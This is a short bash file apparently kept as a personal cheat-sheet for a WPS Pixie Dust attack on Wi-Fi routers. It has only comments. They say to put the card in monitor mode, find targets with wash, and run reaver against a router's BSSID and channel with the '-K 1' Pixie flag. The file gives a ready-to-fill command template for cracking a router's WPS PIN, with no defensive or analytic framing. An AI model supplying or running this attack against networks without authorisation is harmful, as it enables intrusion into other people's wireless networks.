#!/bin/bash
# WPS pixie attack
# Monitor mode first
# wash -i (interface)  to find a target
# reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
# "-K 1" means pixieattack and "-f" means fixed channel so it doesn't hop channels.
